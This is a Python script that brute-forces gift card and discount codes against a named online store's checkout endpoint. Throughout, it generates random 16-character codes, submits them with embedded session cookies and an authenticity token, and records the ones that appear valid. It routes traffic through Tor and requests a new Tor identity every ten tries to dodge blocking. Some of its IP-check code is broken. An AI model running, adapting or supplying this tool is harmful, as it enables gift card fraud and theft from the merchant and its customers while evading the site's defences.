#! /usr/bin/env python
import requests
import string
import random
import re
import calendar, time
import sys

from stem import Signal
from stem.control import Controller


class Session:

    def __init__(self):
        super().__init__()
        self.session = requests.session()
        self.proxies = {
            'http': 'socks5://localhost:9150',
            'https': 'socks5://localhost:9150'
        }
        self.headers = {}
        self.ip = None
        self.tried_codes = list()
        self.current_code = None

    
    def import_tried_codes(self):
        with open("tried_codes.txt") as f:
            for line in f:
                self.tried_codes.append(line)
        print(self.tried_codes)


    def setup_params(self):
        self.session.proxies['http'] = 'socks5://localhost:9150'
        self.session.proxies['https'] = 'socks5://localhost:9150'
        self.headers['User-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36'
        self.headers['Origin'] = 'https://www.vqfit.com'
        self.headers['Referer'] = 'https://www.vqfit.com'

    
    def start(self):
        x = 1
        self.import_tried_codes()
        while True:
            self.generate_code()
            self.apply_giftcard()
            self.check_code()
            x += 1
            if x == 10:
                x = 1
                print("Getting new IP adres before being blocked.", end=' ')
                # Reset session
                self.reset_session()
                # check if we got a new ip
                if self.got_new_ip():
                    print("Succesfully got a new IP adres: " + self.ip + "\n")
                else:
                    print("Failed getting a new IP adres, we still are: " + self.ip + "\n")
                # TO-DO: add new product to cart if neccesary


    def generate_code(self, size=16):
        list = 'ABCDEFG0123456789'
        self.current_code = ''.join(random.choice(list) for _ in range(size))
        while self.current_code in self.tried_codes:
            self.current_code = ''.join(random.choice(list) for _ in range(size))
        print("Found new code: " + self.current_code + ". Let's check it.", end=' ')
        self.tried_codes.append(self.current_code)


    def apply_giftcard(self):
        cookies = {
                'checkout': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVZoTVdZd09XRTJNVFkyTkdGaVpHTmlObUkyTlRKaVpHUm1NakV4T0RVM053WTZCa1ZVIiwiZXhwIjoiMjAyMC0wMy0yNlQwOToyOTowNS44MzVaIiwicHVyIjoiY29va2llLmNoZWNrb3V0In19--9b9ae9790a8a14f8e2d12d91bc8c2ff8da60fbad',
                'checkout_token': 'eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaEpJaVUzWkRrNU1tRTNaR00xWW1SaFlXSXdaVEJqTmpKalpHRXpPR0UwTjJVeU5BWTZCa1ZVIiwiZXhwIjoiMjAyMS0wMy0wNVQwOToyOTowNS44MzZaIiwicHVyIjoiY29va2llLmNoZWNrb3V0X3Rva2VuIn19--90b65c78c6ab3b2a1764aec4a7c4ad01531644a5'
        }

        data = {
                '_method': 'patch', 
                'authenticity_token': 'DFR+/blyU3xFrjuKEuIgzRJgyXB/Z6YZQH5koWsdlHetukNMXHDVRCAMh+V5/+8PPjcQlQBGARG2izlEhcCOQQ==', 
                'step': 'contact_information', 
                'checkout[reduction_code]': self.current_code
        }

        r = requests.post('https://www.vqfit.com/5853653/checkouts/7d992a7dc5bdaab0e0c62cda38a47e24', 
            cookies=cookies, data=data, headers=self.headers, proxies=self.proxies)
        self.content = r.content

    
    def check_code(self):
        pattern = 'Enter a valid discount code or gift card'
        match = re.search(pattern, str(self.content))
        if match:
            print("Wrong code.")
            self.write_to_file("tried_codes.txt", self.current_code)
            return False
        else:
            print("The code has returned that it is valid!")
            self.write_to_file("codes.txt", self.current_code)
            return True


    def write_to_file(self, file, code):
        file = open(file, "a+")
        file.write(code)
        file.write(",")
        file.close()

    def reset_session(self):
        with Controller.from_port(port=9151) as controller:
            controller.authenticate(password="xxx")
            controller.signal(Signal.NEWNYM)
            time.sleep(controller.get_newnym_wait())
        self.session.cookies.clear()
        self.session = requests.session()


    def got_new_ip(self):
        new_ip = requests.get('http://httpbin.org/ip', proxies=self.proxies)#.text[15:29]
        try:
            ip_addr = re.search('"(.+?)"', new_ip).group(2)
        except AttributeError:
            ip_addr = ''
        if new_ip is not self.ip:
            self.ip = new_ip
            return True
        else:
            return False


session = Session()
session.setup_params()
session.start()

